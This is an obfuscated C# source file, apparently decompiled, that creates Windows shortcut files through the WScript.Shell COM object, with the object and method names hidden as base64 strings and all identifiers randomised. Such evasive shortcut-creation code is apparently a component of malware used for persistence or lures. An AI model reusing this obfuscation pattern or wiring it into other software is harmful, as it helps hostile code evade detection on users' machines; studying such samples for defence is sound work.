using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace nLpTFjJRwUBp;

public class pAKcNBrOhpMCpM
{
	[ComImport]
	[TypeLibType(4160)]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	private interface bUaipEBEOnfzFB
	{
		[DispId(0)]
		string ZcSoRkewBVLtofc
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string AZSiucBDXoKqYOXh
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string wWVQCzkWxNupWJ
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string tPITdTlDXFvku
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string bImmlxasxTmqu
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string ZyVjjcpyVTalBx
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string XcRslaHEhCr
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int EAsxtuTOsuwPjBu
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string BZBNrrPnNHQn
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(2000)]
		[TypeLibFunc(64)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type pRWKGkLLLC = Type.GetTypeFromProgID(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("V1NjcmlwdC5TaGVsbA=="));

	private static object rGFcbziiMFvNY = Activator.CreateInstance(pRWKGkLLLC);

	public static void vNNFpnAhKTQEx(string yoquJWPeeyxuWMP, string PHhhmRPCbIsHmJY, string LNadtfAieQv, string HtoaKkdbqAFO, string lGyJonxssatSVkm, string SMskXXERiIRDbo, string pkjofnOLKUZ)
	{
		try
		{
			bUaipEBEOnfzFB bUaipEBEOnfzFB = (bUaipEBEOnfzFB)pRWKGkLLLC.InvokeMember(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, rGFcbziiMFvNY, new object[1] { yoquJWPeeyxuWMP });
			bUaipEBEOnfzFB.wWVQCzkWxNupWJ = lGyJonxssatSVkm;
			bUaipEBEOnfzFB.tPITdTlDXFvku = SMskXXERiIRDbo;
			bUaipEBEOnfzFB.XcRslaHEhCr = PHhhmRPCbIsHmJY;
			bUaipEBEOnfzFB.BZBNrrPnNHQn = HtoaKkdbqAFO;
			bUaipEBEOnfzFB.AZSiucBDXoKqYOXh = LNadtfAieQv;
			if (!string.IsNullOrEmpty(pkjofnOLKUZ))
			{
				bUaipEBEOnfzFB.bImmlxasxTmqu = pkjofnOLKUZ;
			}
			bUaipEBEOnfzFB.Save();
		}
		catch (Exception ex)
		{
			if (RLgUMHIwwGSuCLo.QWMTAZEOVrAU)
			{
				try
				{
					File.AppendAllText(RLgUMHIwwGSuCLo.kOKakAljNFiEE, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
